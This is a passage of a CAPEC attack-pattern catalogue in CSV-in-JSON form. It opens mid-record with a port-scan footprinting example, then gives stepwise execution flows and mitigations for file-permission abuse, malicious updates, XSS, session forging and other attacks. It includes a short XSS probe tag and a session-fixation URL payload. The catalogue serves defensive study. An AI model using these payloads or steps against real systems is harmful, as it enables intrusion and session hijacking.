192.173.28.130 NS2. fierymonkey.ORG 64.192.168.80 A corner stone of footprinting is Port Scanning. Let's port scan nijasvspirates.org and see what kind of services are running on that box. We type in the nijasvspirates IP into the Host prompt of the Port Scan window. We'll start searching from port number 1, and we'll stop at the default Sub7 port, 27374. Our results are: 21 TCP ftp 22 TCP ssh SSH-1.99-OpenSSH_2.30 25 TCP smtp 53 TCP domain 80 TCP www 110 TCP pop3 111 TCP sunrpc 113 TCP ident Just by this we know that Alice is running a website and email, using POP3, SUNRPC (SUN Remote Procedure Call), and ident.::\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1217:ENTRY NAME:Browser Bookmark Discovery::::TAXONOMY NAME:ATTACK:ENTRY ID:1592:ENTRY NAME:Gather Victim Host Information::::TAXONOMY NAME:ATTACK:ENTRY ID:1595:ENTRY NAME:Active Scanning::\",\"\",\n17,\"Using Malicious Files\",Standard,Draft,\"An attack of this type exploits a system's configuration that allows an adversary to either directly access an executable file, for example through shell access; or in a possible worst case allows an adversary to upload a file and then execute it. Web servers, ftp servers, and message oriented middleware systems which have many integration points are particularly vulnerable, because both the programmers and the administrators must be in synch regarding the interfaces and the correct privileges for each interface.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:233::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine File/Directory Configuration] The adversary looks for misconfigured files or directories on a system that might give executable access to an overly broad group of users.:TECHNIQUE:Through shell access to a system, use the command ls -l to view permissions for files and directories.::STEP:2:PHASE:Experiment:DESCRIPTION:[Upload Malicious Files] If the adversary discovers a directory that has executable permissions, they will attempt to upload a malicious file to execute.:TECHNIQUE:Upload a malicious file through a misconfigured FTP server.::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute Malicious File] The adversary either executes the uploaded malicious file, or executes an existing file that has been misconfigured to allow executable access to the adversary.::\",\"::System's configuration must allow an attacker to directly access executable files or upload files to execute. This means that any access control system that is supposed to mediate communications between the subject and the object is set incorrectly or assumes a benign environment.::\",\"::SKILL:To identify and execute against an over-privileged system interface:LEVEL:Low::\",\"::Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Design: Enforce principle of least privilege::Design: Run server interfaces with a non-root account and/or utilize chroot jails or other configuration techniques to constrain privileges even if attacker gains some limited access to commands.::Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.::\",\"::Consider a directory on a web server with the following permissions drwxrwxrwx 5 admin public 170 Nov 17 01:08 webroot This could allow an attacker to both execute and upload and execute programs' on the web server. This one vulnerability can be exploited by a threat to probe the system and identify additional vulnerabilities to exploit.::\",\"::732::285::272::59::282::270::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.005:ENTRY NAME:Hijack Execution Flow: Executable Installer File Permissions Weakness::::TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: Services File Permissions Weakness::\",\"\",\n177,\"Create files with the same name as files protected with a higher classification\",Detailed,Draft,\"An attacker exploits file location algorithms in an operating system or application by creating a file with the same name as a protected or privileged file. The attacker could manipulate the system if the attacker-created file is trusted by the operating system or an application component that attempts to load the original file. Applications often load or include external files, such as libraries or configuration files. These files should be protected against malicious manipulation. However, if the application only uses the name of the file when locating it, an attacker may be able to create a file with the same name and place it in a directory that the application will search before the directory with the legitimate file is searched. Because the attackers' file is discovered first, it would be used by the target application. This attack can be extremely destructive if the referenced file is executable and/or is granted special privileges based solely on having a particular name.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"::The target application must include external files. Most non-trivial applications meet this criterion.::The target application does not verify that a located file is the one it was looking for through means other than the name. Many applications fail to perform checks of this type.::The directories the target application searches to find the included file include directories writable by the attacker which are searched before the protected directory containing the actual files. It is much less common for applications to meet this criterion, but if an attacker can manipulate the application's search path (possibly by controlling environmental variables) then they can force this criterion to be met.::\",\"\",\"::The attacker must have sufficient access to place an arbitrarily named file somewhere early in the application's search path.::\",\"\",\"\",\"\",\"\",\"::706::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036:ENTRY NAME:Masquerading::\",\"\",\n180,\"Exploiting Incorrectly Configured Access Control Security Levels\",Standard,Draft,\"An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:17::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user.:TECHNIQUE:Spider the web site for all available links.:TECHNIQUE:Brute force to guess all function names/action with different privileges.::STEP:2:PHASE:Experiment:DESCRIPTION:[Identify weak points in access control configurations] The attacker probes the access control for functions and data identified in the Explore phase to identify potential weaknesses in how the access controls are configured.:TECHNIQUE:The attacker attempts authenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts unauthenticated access to targeted functions and data.:TECHNIQUE:The attacker attempts indirect and side channel access to targeted functions and data.::STEP:3:PHASE:Exploit:DESCRIPTION:[Access the function or data bypassing the access control] The attacker executes the function or accesses the data identified in the Explore phase bypassing the access control.:TECHNIQUE:The attacker executes the function or accesses the data not authorized to them.::\",\"::The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..::\",\"::SKILL:In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Design: Configure the access control correctly.::\",\"::For example, an incorrectly configured Web server, may allow unauthorized access to it, thus threaten the security of the Web application.::\",\"::732::1190::1191::1193::1220::1268::1280::1297::1311::1315::1318::1320::1321::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: Services File Permissions Weaknesses::\",\"\",\n186,\"Malicious Software Update\",Standard,Draft,\"An adversary uses deceptive methods to cause a user or an automated process to download and install dangerous code believed to be a valid update that originates from an adversary controlled source.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:184::NATURE:CanFollow:CAPEC ID:98::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target] The adversary must first identify what they want their target to be. Because malicious software updates can be carried out in a variety of ways, the adversary will first not only identify a target program, but also what users they wish to target. This attack can be targeted (a particular user or group of users) or untargeted (many different users).::STEP:2:PHASE:Experiment:DESCRIPTION:[Craft a deployment mechanism based on the target] The adversary must craft a deployment mechanism to deploy the malicious software update. This mechanism will differ based on if the attack is targeted or untargeted.:TECHNIQUE:Targeted attack: hosting what appears to be a software update, then harvesting actual email addresses for an organization, or generating commonly used email addresses, and then sending spam, phishing, or spear-phishing emails to the organization's users requesting that they manually download and install the malicious software update.:TECHNIQUE:Targeted attack: Instant Messaging virus payload, which harvests the names from a user's contact list and sends instant messages to those users to download and apply the update:TECHNIQUE:Untargeted attack: Spam the malicious update to as many users as possible through unsolicited email, instant messages, or social media messages.:TECHNIQUE:Untargeted attack: Send phishing emails to as many users as possible and pretend to be a legitimate source suggesting to download an important software update.:TECHNIQUE:Untargeted attack: Use trojans/botnets to aid in either of the two untargeted attacks.::STEP:3:PHASE:Exploit:DESCRIPTION:[Deploy malicious software update] Using the deployment mechanism from the previous step, the adversary gets a user to install the malicious software update.::\",\"\",\"::SKILL:This attack requires advanced cyber capabilities:LEVEL:High::\",\"::Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the adversary to host a payload and then trigger the installation of the payload code.::\",\"\",\"::SCOPE:Access Control:SCOPE:Availability:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Utilize the built-in software update mechanisms of the commercial components to deliver software that could compromise security credentials, enable a denial-of-service attack, or enable tracking.::\",\"::Validate software updates before installing.::\",\"::Using an automated process to download and install dangerous code was key part of the NotPeyta attack [REF-697]::\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"TYPE:Other:NOTE:Other class of attacks focus on firmware, where malicious updates are made to the core system firmware or BIOS. Since this occurs outside the controls of the operating system, the OS detection and prevention mechanisms do not aid, thus allowing an adversary to evade defenses as well as gain persistence on the target's system.::\",\n187,\"Malicious Automated Software Update via Redirection\",Detailed,Draft,\"An attacker exploits two layers of weaknesses in server or client software for automated update mechanisms to undermine the integrity of the target code-base. The first weakness involves a failure to properly authenticate a server as a source of update or patch content. This type of weakness typically results from authentication mechanisms which can be defeated, allowing a hostile server to satisfy the criteria that establish a trust relationship. The second weakness is a systemic failure to validate the identity and integrity of code downloaded from a remote location, hence the inability to distinguish malicious code from a legitimate update.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:186::\",\"\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Availability:SCOPE:Confidentiality:TECHNICAL IMPACT:Execute Unauthorized Commands::\",\"\",\"\",\"::494::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1072:ENTRY NAME:Software Deployment Tools::\",\"\",\n19,\"Embedding Scripts within Scripts\",Standard,Stable,\"An adversary leverages the capability to execute their own script by embedding it within other scripts that the target software is likely to execute due to programs' vulnerabilities that are brought on by allowing remote hosts to execute scripts.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:242::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Spider] Using a browser or an automated tool, an adversary records all entry points for inputs that happen to be reflected in a client-side script element. These script elements can be located in the HTML content (head, body, comments), in an HTML tag, XML, CSS, etc.:TECHNIQUE:Use a spidering tool to follow and record all non-static links that are likely to have input parameters (through forms, URL, fragments, etc.) actively used by the Web application.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:[Probe identified potential entry points for XSS vulnerability] The adversary uses the entry points gathered in the Explore phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use an automated injection attack tool to inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a server-side script elements context and observe system behavior to determine if script was executed.:TECHNIQUE:Use a proxy tool to record results of the created requests.::STEP:3:PHASE:Exploit:DESCRIPTION:[Steal session IDs, credentials, page content, etc.] As the adversary succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the adversary.:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute appropriately.::STEP:4:PHASE:Exploit:DESCRIPTION:[Forceful browsing] When the adversary targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site:TECHNIQUE:Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an adversary's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).::STEP:5:PHASE:Exploit:DESCRIPTION:[Content spoofing] By manipulating the content, the adversary targets the information that the user would like to get from the website.:TECHNIQUE:Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes adversary-modified invalid information to the user on the current web page.::\",\"::Target software must be able to execute scripts, and also grant the adversary privilege to write/upload scripts.::\",\"::SKILL:To load malicious script into open, e.g. world writable directory:LEVEL:Low::SKILL:Executing remote scripts on host and collecting output:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use browser technologies that do not allow client side scripting.::Utilize strict type, character, and encoding enforcement.::Server side developers should not proxy content via XHR or other means. If a HTTP proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.::Ensure all content that is delivered to client is sanitized against an acceptable content specification.::Perform input validation for all remote content.::Perform output validation for all remote content.::Disable scripting languages such as JavaScript in browser::Session tokens for specific host::Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this.::Privileges are constrained, if a script is loaded, ensure system runs in chroot jail or other limited authority mode::\",\"::Ajax applications enable rich functionality for browser based web applications. Applications like Google Maps deliver unprecedented ability to zoom in and out, scroll graphics, and change graphic presentation through Ajax. The security issues that an adversary may exploit in this instance are the relative lack of security features in JavaScript and the various browser's implementation of JavaScript, these security gaps are what XSS and a host of other client side vulnerabilities are based on. While Ajax may not open up new security holes, per se, due to the conversational aspects between client and server of Ajax communication, attacks can be optimized. A single zoom in or zoom out on a graphic in an Ajax application may round trip to the server dozens of times. One of the first steps many adversarys take is frequently footprinting an environment, this can include scanning local addresses like 192.*.*.* IP addresses, checking local directories, files, and settings for known vulnerabilities, and so on. <IMG SRC=javascript:alert('XSS')> The XSS script that is embedded in a given IMG tag can be manipulated to probe a different address on every click of the mouse or other motions that the Ajax application is aware of. In addition the enumerations allow for the adversary to nest sequential logic in the attacks. While Ajax applications do not open up brand new attack vectors, the existing attack vectors are more than adequate to execute attacks, and now these attacks can be optimized to sequentially execute and enumerate host environments.::~/.bash_profile and ~/.bashrc are executed in a user's context when a new shell opens or when a user logs in so that their environment is set correctly. ~/.bash_profile is executed for login shells and ~/.bashrc is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), ~/.bash_profile is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, ~/.bashrc is executed. This allows users more fine grained control over when they want certain commands executed. These files are meant to be written to by the local user to configure their own environment; however, adversaries can also insert code into these files to gain persistence each time a user logs in or opens a new shell.::\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1027.009:ENTRY NAME:Obfuscated Files or Information: Embedded Payloads::::TAXONOMY NAME:ATTACK:ENTRY ID:1546.004:ENTRY NAME:Event Triggered Execution:.bash_profile and .bashrc::::TAXONOMY NAME:ATTACK:ENTRY ID:1546.016:ENTRY NAME:Event Triggered Execution: Installer Packages::\",\"\",\n191,\"Read Sensitive Constants Within an Executable\",Detailed,Draft,\"An adversary engages in activities to discover any sensitive constants present within the compiled code of an executable. These constants may include literal ASCII strings within the file itself, or possibly strings hard-coded into particular routines that can be revealed by code refactoring methods including static and dynamic analysis.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:167::\",\"\",\"::Access to a binary or executable such that it can be analyzed by various utilities.::\",\"\",\"::Binary analysis programs such as 'strings' or 'grep', or hex editors.::\",\"\",\"\",\"\",\"\",\"::798::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1552.001:ENTRY NAME:Unsecured Credentials:Credentials in files::\",\"TYPE:Other:NOTE:More sophisticated methods of searching for sensitive strings within a file involve disassembly or decompiling of the file. One could, for example, utilize disassembly methods on an ISAPI executable or dll to discover a hard-coded password within the code as it executes. This type of analysis usually involves four stages in which first a debugger is attached to the running process, anti-debugging countermeasures are circumvented or bypassed, the program is analyzed step-by-step, and breakpoints are established so that discrete functions and data structures can be analyzed. Debugging tools such as SoftICE, Ollydbg, or vendor supplied debugging tools are often used. Disassembly tools such as IDA pro, or similar tools, can also be employed. A third strategy for accessing sensitive strings within a binary involves the decompilation of the file itself into source code that reveals the strings. An example of this type of analysis involves extracting source code from a java JAR file and then using functionality within a java IDE to search the source code for sensitive, hard-coded information. In performing this analysis native java tools, such as jar are used to extract the compiled class files. Next, a java decompiler such as DJ is used to extract java source code from the compiled classes, revealing source code. Finally, the source code is audited to reveal sensitive information, a step that is usually assisted by source code analysis programs.::\",\n196,\"Session Credential Falsification through Forging\",Standard,Draft,\"An attacker creates a false but functional session credential in order to gain or usurp access to a service. Session credentials allow users to identify themselves to a service after an initial authentication without needing to resend the authentication information (usually a username and password) with every message. If an attacker is able to forge valid session credentials they may be able to bypass authentication or piggy-back off some other authenticated user's session. This attack differs from Reuse of Session IDs and Session Sidejacking attacks in that in the latter attacks an attacker uses a previous or existing credential without modification while, in a forging attack, the attacker must create their own credential, although it may be based on previously observed credentials.\",\"\",Medium,Medium,\"::NATURE:CanPrecede:CAPEC ID:384::NATURE:CanPrecede:CAPEC ID:61::NATURE:ChildOf:CAPEC ID:21::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Analyze and Understand Session IDs] The attacker finds that the targeted application use session credentials to identify legitimate users.:TECHNIQUE:An attacker makes many anonymous connections and records the session IDs.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Create Session IDs.] Attackers craft messages containing their forged credentials in GET, POST request, HTTP headers or cookies.:TECHNIQUE:The attacker manipulates the HTTP request message and adds their forged session IDs in to the requests or cookies.::STEP:3:PHASE:Exploit:DESCRIPTION:[Abuse the Victim's Session Credentials] The attacker fixates falsified session ID to the victim when victim access the system. Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the forged session identifier.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their browser and browses to protected data or functionality.:TECHNIQUE:The attacker loads the predefined or predicted session ID into their software and utilizes functionality with the rights of the victim.::\",\"::The targeted application must use session credentials to identify legitimate users. Session identifiers that remains unchanged when the privilege levels change. Predictable session identifiers.::\",\"::SKILL:Forge the session credential and reply the request.:LEVEL:Medium::\",\"::Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::\",\"::Implementation: Use session IDs that are difficult to guess or brute-force: One way for the attackers to obtain valid session IDs is by brute-forcing or guessing them. By choosing session identifiers that are sufficiently random, brute-forcing or guessing becomes very difficult.::Implementation: Regenerate and destroy session identifiers when there is a change in the level of privilege: This ensures that even though a potential victim may have followed a link with a fixated identifier, a new one is issued when the level of privilege changes.::\",\"::This example uses client side scripting to set session ID in the victim's browser. The JavaScript code document.cookie=sessionid=0123456789 fixates a falsified session credential into victim's browser, with the help of crafted a URL link. http://www.example.com/<script>document.cookie=sessionid=0123456789;</script> A similar example uses session ID as an argument of the URL. http://www.example.com/index.php/sessionid=0123456789 Once the victim clicks the links, the attacker may be able to bypass authentication or piggy-back off some other authenticated victim's session.::\",\"::384::664::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1134.002:ENTRY NAME:Access Token Manipulation: Create Process with Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1134.003:ENTRY NAME:Access Token Manipulation: Make and Impersonate Token::::TAXONOMY NAME:ATTACK:ENTRY ID:1606:ENTRY NAME:Forge Web Credentials::\",\"\",\n2,\"Inducing Account Lockout\",Standard,Draft,\"An attacker leverages the security functionality of the system aimed at thwarting potential attacks to launch a denial of service attack against a legitimate system user. Many systems, for instance, implement a password throttling mechanism that locks an account after a certain number of incorrect log in attempts. An attacker can leverage this throttling mechanism to lock a legitimate user out of their own account. The weakness that is being leveraged by an attacker is the very security feature that has been put in place to counteract attacks.\",\"\",High,Medium,\"::NATURE:ChildOf:CAPEC ID:212::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:[Investigate account lockout behavior of system] Investigate the security features present in the system that may trigger an account lockout:TECHNIQUE:Analyze system documentation to find list of events that could potentially cause account lockout:TECHNIQUE:Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly:TECHNIQUE:Determine another user's login ID, and attempt to brute force the password (or other credentials) for it a predetermined number of times, or until the system provides an indication that the account is locked out.::STEP:2:PHASE:Experiment:DESCRIPTION:[Obtain list of user accounts to lock out] Generate a list of valid user accounts to lock out:TECHNIQUE:Obtain list of authorized users using another attack pattern, such as SQL Injection.:TECHNIQUE:Attempt to create accounts if possible; system should indicate if a user ID is already taken.:TECHNIQUE:Attempt to brute force user IDs if system reveals whether a given user ID is valid or not upon failed login attempts.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lock Out Accounts] Perform lockout procedure for all accounts that the attacker wants to lock out.:TECHNIQUE:For each user ID to be locked out, perform the lockout procedure discovered in the first step.::\",\"::The system has a lockout mechanism.::An attacker must be able to reproduce behavior that would result in an account being locked.::\",\"::SKILL:No programming skills or computer knowledge is needed. An attacker can easily use this attack pattern following the Execution Flow above.:LEVEL:Low::\",\"::Computer with access to the login portion of the target system::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::\",\"::Implement intelligent password throttling mechanisms such as those which take IP address into account, in addition to the login name.::When implementing security features, consider how they can be misused and made to turn on themselves.::\",\"::A famous example of this type an attack is the eBay attack. eBay always displays the user id of the highest bidder. In the final minutes of the auction, one of the bidders could try to log in as the highest bidder three times. After three incorrect log in attempts, eBay password throttling would kick in and lock out the highest bidder's account for some time. An attacker could then make their own bid and their victim would not have a chance to place the counter bid because they would be locked out. Thus an attacker could win the auction.::\",\"::645::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1531:ENTRY NAME:Account Access Removal::\",\"\",\n203,\"Manipulate Registry Information\",Standard,Stable,\"An adversary exploits a weakness in authorization in order to modify content within a registry (e.g., Windows Registry, Mac plist, application registry). Editing registry information can permit the adversary to hide configuration information or remove indicators of compromise to cover up activity. Many applications utilize registries to store configuration and service information. As such, modification of registry information can affect individual services (affecting billing, authorization, or even allowing for identity spoofing) or the overall configuration of a targeted application. For example, both Java RMI and SOAP use registries to track available services. Changing registry values is sometimes a preliminary step towards completing another attack pattern, but given the long term usage of many registry values, manipulation of registry information could be its own end.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:176::\",\"\",\"::The targeted application must rely on values stored in a registry.::The adversary must have a means of elevating permissions in order to access and modify registry content through either administrator privileges (e.g., credentialed access), or a remote access tool capable of editing a registry through an API.::\",\"::SKILL:The adversary requires privileged credentials or the development/acquiring of a tailored remote access tool.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"::Ensure proper permissions are set for Registry hives to prevent users from modifying keys.::Employ a robust and layered defensive posture in order to prevent unauthorized users on your system.::Employ robust identification and audit/blocking using an allowlist of applications on your system. Unnecessary applications, utilities, and configurations will have a presence in the system registry that can be leveraged by an adversary through this attack pattern.::\",\"::Manipulating registration information can be undertaken in advance of a path traversal attack (inserting relative path modifiers) or buffer overflow attack (enlarging a registry value beyond an application's ability to store it).::\",\"::15::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1112:ENTRY NAME:Modify Registry::::TAXONOMY NAME:ATTACK:ENTRY ID:1647:ENTRY NAME:Plist Modification::\",\"\","
  },
  "doc-b75b210fe0d7f85e7c9569037b9c0604": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n204,\"Lifting Sensitive Data Embedded in Cache\",Detailed,Draft,\"An adversary examines a target application's cache, or a browser cache, for sensitive information. Many applications that communicate with remote entities or which perform intensive calculations utilize caches to improve efficiency. However, if the application computes or receives sensitive information and the cache is not appropriately protected, an attacker can browse the cache and retrieve this information. This can result in the disclosure of sensitive information.\",\"\",,Medium,\"::NATURE:ChildOf:CAPEC ID:167::NATURE:CanPrecede:CAPEC ID:560::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify Application Cache] An adversary first identifies an application that utilizes a cache. This could either be a web application storing data in a browser cache, or an application running on a separate machine. The adversary examines the cache to determine file permissions and possible encryption.:TECHNIQUE:Use probing tools to look for application cache files on a machine.:TECHNIQUE:Use a web application and determine if any sensitive information is stored in browser cache.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt to Access Cache] Once the cache has been discovered, the adversary attempts to access the cached data. This often requires previous access to a machine hosting the target application.:TECHNIQUE:Use priviledge escalation to access cache files that might have strict privileges.:TECHNIQUE:If the application cache is encrypted with weak encryption, attempt to understand the encryption technique and break the encryption.::STEP:3:PHASE:Exploit:DESCRIPTION:[Lift Sensitive Data from Cache] After gaining access to cached data, an adversary looks for potentially sensitive information and stores it for malicious use. This sensitive data could possibly be used in follow-up attacks related to authentication or authorization.:TECHNIQUE:Using a public computer, or gaining access to a victim's computer, examine browser cache to look for sensitive data left over from previous sessions.::\",\"::The target application must store sensitive information in a cache.::The cache must be inadequately protected against attacker access.::\",\"\",\"::The attacker must be able to reach the target application's cache. This may require prior access to the machine on which the target application runs. If the cache is encrypted, the attacker would need sufficient computational resources to crack the encryption. With strong encryption schemes, doing this could be intractable, but weaker encryption schemes could allow an attacker with sufficient resources to read the file.::\",\"\",\"\",\"\",\"\",\"::524::311::1239::1258::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::\",\"\",\n206,\"Signing Malicious Code\",Detailed,Draft,\"The adversary extracts credentials used for code signing from a production environment and then uses these credentials to sign malicious content with the developer's key. Many developers use signing keys to sign code or hashes of code. When users or applications verify the signatures are accurate they are led to believe that the code came from the owner of the signing key and that the code has not been modified since the signature was applied. If the adversary has extracted the signing credentials then they can use those credentials to sign their own code bundles. Users or tools that verify the signatures attached to the code will likely assume the code came from the legitimate developer and install or run the code, effectively allowing the adversary to execute arbitrary code on the victim's computer. This differs from CAPEC-673, because the adversary is performing the code signing.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:The adversary first attempts to obtain a digital certificate in order to sign their malware or tools. This certificate could be stolen, created by the adversary, or acquired normally through a certificate authority.::STEP:2:PHASE:Explore:DESCRIPTION:Based on the type of certificate obtained, the adversary will create a goal for their attack. This is either a broad or targeted attack. If an adversary was able to steal a certificate from a targeted organization, they could target this organization by pretending to have legitimate code signed by them. In other cases, the adversary would simply sign their malware and pose as legitimate software such that any user might trust it. This is the more broad approach::STEP:3:PHASE:Experiment:DESCRIPTION:The adversary creates their malware and signs it with the obtained digital certificate. The adversary then checks if the code that they signed is valid either through downloading from the targeted source or testing locally.::STEP:4:PHASE:Exploit:DESCRIPTION:Once the malware has been signed, it is then deployed to the desired location. They wait for a trusting user to run their malware, thinking that it is legitimate software. This malware could do a variety of things based on the motivation of the adversary.::\",\"::The targeted developer must use a signing key to sign code bundles. (Note that not doing this is not a defense - it only means that the adversary does not need to steal the signing key before forging code bundles in the developer's name.)::\",\"\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"\",\"::Ensure digital certificates are protected and inaccessible by unauthorized uses.::If a digital certificate has been compromised it should be revoked and regenerated.::Even if a piece of software has a valid and trusted digital signature, it should be assessed for any weaknesses and vulnerabilities.::\",\"::In the famous Stuxnet malware incident, two digital certificates were compromised in order to sign malicious device drivers with legitimate credentials. The signing resulted in the malware appearing as trusted by the system it was running on, which facilitated the installation of the malware in kernel mode. This further resulted in Stuxnet remaining undetected for a significant amount of time. [REF-699]::The cyber espionage group CyberKittens leveraged a stolen certificate from AI Squared that allowed them to leverage a signed executable within Operation Wilted Tulip. This ultimately allowed the executable to run as trusted on the system, allowing a Crowd Strike stager to be loaded within the 